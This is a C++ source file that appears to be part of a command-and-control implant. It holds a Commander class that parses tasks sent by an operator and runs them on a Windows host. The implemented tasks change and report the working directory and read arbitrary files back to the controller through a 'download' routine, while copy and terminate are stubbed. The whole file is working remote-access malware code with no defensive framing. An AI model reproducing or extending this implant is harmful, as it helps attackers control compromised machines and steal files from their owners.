#include "Commander.h"

Commander::Commander(Agent* a)
{
	this->agent = a;
}

void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacker)
{
	if (recvSize < 8)
		return;

	Packer* inPacker  = (Packer*)MemAllocLocal(sizeof(Packer));
	*inPacker = Packer( recv, recvSize );

	ULONG packerSize = inPacker->Unpack32();
	while ( packerSize + 4 > inPacker->GetDataSize())
	{	
		ULONG CommandId = inPacker->Unpack32();
		switch ( CommandId )
		{

		case COMMAND_CD:        
			this->CmdCd(CommandId, inPacker, outPacker); break;
	
		case COMMAND_CP:        
			break;
		
		case COMMAND_DOWNLOAD:
			this->CmdDownload(CommandId, inPacker, outPacker); break;

		case COMMAND_PWD:       
			this->CmdPwd(CommandId, inPacker, outPacker); break;
		
		case COMMAND_TERMINATE: break;
		
		default: break;
		}
	}
}

void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = inPacker->UnpackStringA(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->SetCurrentDirectoryA(path);
	if (result) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG filenameSize = 0;
	CHAR* filename     = inPacker->UnpackStringA(&filenameSize);
	ULONG taskId       = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	HANDLE hFile = ApiWin->CreateFile(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
	else {
		CHAR  fullPath[MAX_PATH];
		DWORD pathSize = ApiWin->GetFullPathNameA( filename, MAX_PATH, fullPath, NULL);
		DWORD fileSize = ApiWin->GetFileSize( hFile, 0 );

		if (pathSize > 0) {
			DownloadData downloadData = this->agent->downloader->CreateDownloadData(taskId, hFile, fileSize);
			outPacker->Pack32(COMMAND_DOWNLOAD);
			outPacker->Pack32(downloadData.fileId);
			outPacker->Pack8(DOWNLOAD_START);
			outPacker->Pack32(downloadData.fileSize);
			outPacker->PackBytes((PBYTE)fullPath, pathSize - 1);
		}
		else {
			outPacker->Pack32(COMMAND_ERROR);
			outPacker->Pack32(TEB->LastErrorValue);
		}
	}
}

void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	CHAR  path[MAX_PATH] = { 0 };
	ULONG pathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, path);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	if (pathSize) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}